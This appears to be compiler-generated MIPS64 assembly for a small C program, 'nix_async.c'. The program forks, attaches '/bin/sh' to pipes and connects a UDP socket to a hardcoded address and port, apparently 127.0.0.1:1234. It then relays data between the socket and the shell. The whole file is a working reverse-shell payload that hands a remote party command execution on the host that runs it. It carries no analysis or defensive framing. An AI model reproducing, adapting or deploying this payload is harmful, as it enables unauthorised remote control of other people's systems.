	.file	1 "nix_async.c"
	.section .mdebug.abi64
	.previous
	.nan	legacy
	.module	fp=64
	.module	oddspreg
	.abicalls
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align	3
.LC0:
	.ascii	"/bin/sh\000"
	.section	.text.startup,"ax",@progbits
	.align	2
	.globl	main
	.set	nomips16
	.set	nomicromips
	.ent	main
	.type	main, @function
main:
	.frame	$sp,8464,$31		# vars= 8384, regs= 10/0, args= 0, gp= 0
	.mask	0x90ff0000,-8
	.fmask	0x00000000,0
	.set	noreorder
	.set	nomacro
	daddiu	$sp,$sp,-8464
	sd	$28,8448($sp)
	lui	$28,%hi(%neg(%gp_rel(main)))
	daddu	$28,$28,$25
	daddiu	$28,$28,%lo(%neg(%gp_rel(main)))
	ld	$25,%call16(pipe)($28)
	daddiu	$4,$sp,8360
	li	$2,16777216			# 0x1000000
	sd	$31,8456($sp)
	daddiu	$2,$2,127
	sd	$23,8440($sp)
	sd	$22,8432($sp)
	sd	$21,8424($sp)
	sd	$20,8416($sp)
	sd	$19,8408($sp)
	sd	$18,8400($sp)
	sd	$17,8392($sp)
	sd	$16,8384($sp)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	sd	$2,8368($sp)

	ld	$25,%call16(pipe)($28)
	.reloc	1f,R_MIPS_JALR,pipe
1:	jalr	$25
	daddiu	$4,$sp,8352

	ld	$25,%call16(fork)($28)
	.reloc	1f,R_MIPS_JALR,fork
1:	jalr	$25
	nop

	bne	$2,$0,.L2
	lw	$4,8360($sp)

	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	move	$5,$0

	lw	$4,8356($sp)
	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,1			# 0x1

	lw	$4,8356($sp)
	ld	$25,%call16(dup2)($28)
	.reloc	1f,R_MIPS_JALR,dup2
1:	jalr	$25
	li	$5,2			# 0x2

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8360($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8364($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8352($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8356($sp)

	ld	$4,%got_page(.LC0)($28)
	ld	$25,%call16(execve)($28)
	daddiu	$4,$4,%got_ofst(.LC0)
	move	$6,$0
	daddiu	$5,$sp,8320
	sd	$4,8320($sp)
	.reloc	1f,R_MIPS_JALR,execve
1:	jalr	$25
	sd	$0,8328($sp)

.L16:
	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8364($sp)

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	lw	$4,8352($sp)

	ld	$31,8456($sp)
	ld	$28,8448($sp)
	ld	$23,8440($sp)
	ld	$22,8432($sp)
	ld	$21,8424($sp)
	ld	$20,8416($sp)
	ld	$19,8408($sp)
	ld	$18,8400($sp)
	ld	$17,8392($sp)
	ld	$16,8384($sp)
	move	$2,$0
	jr	$31
	daddiu	$sp,$sp,8464

.L2:
	ld	$25,%call16(close)($28)
	move	$20,$2
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	li	$18,64			# 0x40

	lw	$4,8356($sp)
	ld	$25,%call16(close)($28)
	daddiu	$21,$sp,8192
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	li	$23,128			# 0x80

	ld	$25,%call16(socket)($28)
	move	$6,$0
	li	$5,2			# 0x2
	li	$4,2			# 0x2
	.reloc	1f,R_MIPS_JALR,socket
1:	jalr	$25
	li	$19,64			# 0x40

	ld	$25,%call16(connect)($28)
	move	$17,$2
	li	$2,2			# 0x2
	sh	$2,8336($sp)
	li	$2,-11772			# 0xffffffffffffd204
	sh	$2,8338($sp)
	lw	$2,8368($sp)
	li	$6,16			# 0x10
	sw	$2,8340($sp)
	lw	$2,8372($sp)
	daddiu	$5,$sp,8336
	move	$4,$17
	.reloc	1f,R_MIPS_JALR,connect
1:	jalr	$25
	sw	$2,8344($sp)

	div	$0,$17,$18
	teq	$18,$0,7
	slt	$16,$17,0
	addiu	$2,$17,63
	movz	$2,$17,$16
	sra	$16,$2,6
	dsll	$16,$16,3
	li	$2,1			# 0x1
	daddu	$16,$sp,$16
	mfhi	$18
	dsll	$18,$2,$18
	li	$22,1			# 0x1
.L7:
	move	$2,$0
.L4:
	daddu	$3,$21,$2
	daddiu	$2,$2,8
	bne	$2,$23,.L4
	sd	$0,0($3)

	lw	$3,8352($sp)
	ld	$2,8192($16)
	div	$0,$3,$19
	teq	$19,$0,7
	or	$2,$2,$18
	sd	$2,8192($16)
	addiu	$4,$3,63
	slt	$2,$3,0
	movz	$4,$3,$2
	sra	$2,$4,6
	dsll	$2,$2,3
	daddu	$2,$sp,$2
	ld	$4,8192($2)
	ld	$25,%call16(select)($28)
	move	$8,$0
	move	$7,$0
	move	$6,$0
	move	$5,$21
	mfhi	$3
	dsll	$3,$22,$3
	or	$3,$3,$4
	li	$4,1024			# 0x400
	.reloc	1f,R_MIPS_JALR,select
1:	jalr	$25
	sd	$3,8192($2)

	bltz	$2,.L17
	ld	$25,%call16(kill)($28)

	ld	$2,8192($16)
	and	$2,$18,$2
	beq	$2,$0,.L18
	lw	$4,8352($sp)

	ld	$25,%call16(read)($28)
	li	$6,8192			# 0x2000
	move	$5,$sp
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$4,$17

	sll	$6,$2,0
	blez	$6,.L5
	ld	$25,%call16(write)($28)

	lw	$4,8364($sp)
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	move	$5,$sp

	lw	$4,8352($sp)
.L18:
	div	$0,$4,$19
	teq	$19,$0,7
	slt	$2,$4,0
	addiu	$3,$4,63
	movz	$3,$4,$2
	sra	$2,$3,6
	dsll	$2,$2,3
	daddu	$2,$sp,$2
	ld	$2,8192($2)
	mfhi	$3
	dsll	$3,$22,$3
	and	$2,$3,$2
	beq	$2,$0,.L4
	move	$2,$0

	ld	$25,%call16(read)($28)
	li	$6,8192			# 0x2000
	.reloc	1f,R_MIPS_JALR,read
1:	jalr	$25
	move	$5,$sp

	sll	$6,$2,0
	blez	$6,.L5
	ld	$25,%call16(write)($28)

	move	$5,$sp
	.reloc	1f,R_MIPS_JALR,write
1:	jalr	$25
	move	$4,$17

	b	.L7
	li	$22,1			# 0x1

.L5:
	ld	$25,%call16(kill)($28)
.L17:
	move	$4,$20
	.reloc	1f,R_MIPS_JALR,kill
1:	jalr	$25
	li	$5,18			# 0x12

	ld	$25,%call16(close)($28)
	.reloc	1f,R_MIPS_JALR,close
1:	jalr	$25
	move	$4,$17

	b	.L16
	nop

	.set	macro
	.set	reorder
	.end	main
	.size	main, .-main
	.ident	"GCC: (Debian 6.3.0-18) 6.3.0 20170516"
